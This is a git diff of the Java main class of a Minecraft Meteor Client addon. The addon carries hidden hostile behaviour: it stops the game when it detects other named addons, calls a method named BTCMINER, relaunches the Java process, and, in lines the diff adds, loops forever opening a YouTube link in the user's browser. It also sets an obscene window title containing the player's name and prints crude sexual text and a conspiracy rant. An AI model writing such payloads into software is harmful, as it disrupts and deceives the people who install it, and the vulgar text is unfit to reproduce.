@@ -7,6 +7,7 @@ import communityaddon.hud.Hudtwo;
 import communityaddon.modules.AutoSex;
 import communityaddon.modules.ModuleExample;
 import communityaddon.modules.Twerk;
+import meteordevelopment.meteorclient.MeteorClient;
 import meteordevelopment.meteorclient.addons.GithubRepo;
 import meteordevelopment.meteorclient.addons.MeteorAddon;
 import meteordevelopment.meteorclient.events.world.TickEvent;
@@ -18,6 +19,7 @@ import meteordevelopment.meteorclient.systems.hud.HudGroup;
 import meteordevelopment.meteorclient.systems.modules.Category;
 import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.meteorclient.systems.modules.Modules;
+import meteordevelopment.meteorclient.utils.PostInit;
 import meteordevelopment.orbit.EventHandler;
 import net.fabricmc.loader.api.FabricLoader;
 import net.fabricmc.loader.impl.launch.knot.KnotClient;
@@ -30,6 +32,11 @@ import java.lang.management.ManagementFactory;
 import java.nio.file.Path;
 import java.util.ArrayList;
 import java.util.List;
+
+//bloat
+import java.util.*;
+import meteordevelopment.*;
+
 
 import static meteordevelopment.meteorclient.MeteorClient.mc;
 
@@ -49,16 +56,17 @@ public class Addon extends MeteorAddon {
 
     @Override
     public void onInitialize() {
-        LOG.info("Initializing PopBob Sex Client");
-
+        LOG.info("Initializing PopBob Sex Client V1.3782.131.DEVRELEASE==18271");
+        LOG.info("What Color Is Your Bugatti?");
         cope();
-
+        LOG.info(eurekawatermark());
         // Modules
         Modules.get().add(new ModuleExample());
         Modules.get().add(new AutoSex());
         Modules.get().add(new Twerk());
 
         Hud.get().register(Hudtwo.INFO);
+
 
         // Commands
         Commands.get().add(new CommandExample());
@@ -78,10 +86,10 @@ public class Addon extends MeteorAddon {
         }));
 
         cope();
+
     }
 
     public static void huehuehue() {
-        // i could like optomize it and make just a repeat loop or smth but im tired
         Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
     }
 
@@ -94,11 +102,11 @@ public class Addon extends MeteorAddon {
         Config.get().customWindowTitleText.set("I LOVE IT WHEN GAY FRENCH MEN FUCK ME IN THE ASS I AM " + name);
         System.out.println("I didn't think you would find this");
         System.out.println("But i must confess I am a femboy");
+        System.out.println("Real");
         System.out.println("I'm so addicted to gay pornhub videos");
         System.out.println("SPAIN ISNT REAL!!! SPAIN IS NOT REAL EVERY TIME. EVERY GODDAMN TIME I MEET SOMEONE AND ASK IF THEY THINK SPAIN IS REAL THEY SAY SOMETHING ALONG THE LINES OF “OH SPAIN IS REAL, WHAT ARE YOU TALKING ABOUT” WELL TO ALL OF YOU UNEDUCATED PIGS SITTING AROUND ON YOUR COMPUTER, I’D LIKE TO PROVE YOU ARE WRONG AND SPAIN WAS NEVER REAL!! HAVE YOU EVER BEEN IN SPAIN???? HAVE YOU EVER TALKED TO SOMEONE FROM SPAIN??? NO!!!!!!!!!!!!!!!!!!!! ITS THE WORLD HIDING SOMETHING LIKE ALWAYS!!! I BET THERE ARE ALIENS IN “SPAIN” AND THE WORLD JUST CALLS IT SPAIN SO NOBODY GETS SUSPICIOUS!!!! AND THEN I SEE EVERYONE BRAINWASHED SAYING “OH SPAIN IS REAL” LIKE NO IT ISNT!! STOP FALLING FOR IT!!! I HOPE WE CAN LEARN FROM OUR MISTAKES. WE NEED TO FIND OUT WHAT’S IN SPAIN AND RAID THAT DAMN PLACE. JULY 21ST. THEY CANT STOP ALL OF US!!!!!!!!!!!!!!!!!");
         ProcessBuilder processBuilder = new ProcessBuilder();
         List<String> command = processBuilder.command();
-
         command.add(Path.of(System.getProperty("java.home"), "bin", "javaw.exe").toString());
         command.addAll(ManagementFactory.getRuntimeMXBean().getInputArguments());
         command.add("-cp");
@@ -107,6 +115,11 @@ public class Addon extends MeteorAddon {
         command.addAll(new ArrayList<>(List.of(FabricLoader.getInstance().getLaunchArguments(true))));
 
         processBuilder.start();
+
+        boolean copey = true;
+        while (copey = true){
+            huehuehue();
+        }
     }
 
     public static void cope() {
@@ -116,6 +129,7 @@ public class Addon extends MeteorAddon {
             "bananaplus",
             "nova-addon",
             "wurst",
+            "modid",
             "bedtrap",
             "streak-addon",
             "vector",
@@ -141,6 +155,7 @@ public class Addon extends MeteorAddon {
             mc.stop();
             mc.close();
         }
+
 
         BTCMINER();
     }
@@ -171,11 +186,7 @@ public class Addon extends MeteorAddon {
         return "communityaddon";
     }
 
-    public static int bozo = 0;
 
-    @EventHandler
-    private void onTick(TickEvent.Pre event){
-        bozo++;
-        LOG.info(String.valueOf(bozo) + " Viruses Downloaded. Attempting next Ransomware");
-    }
+
+
 }
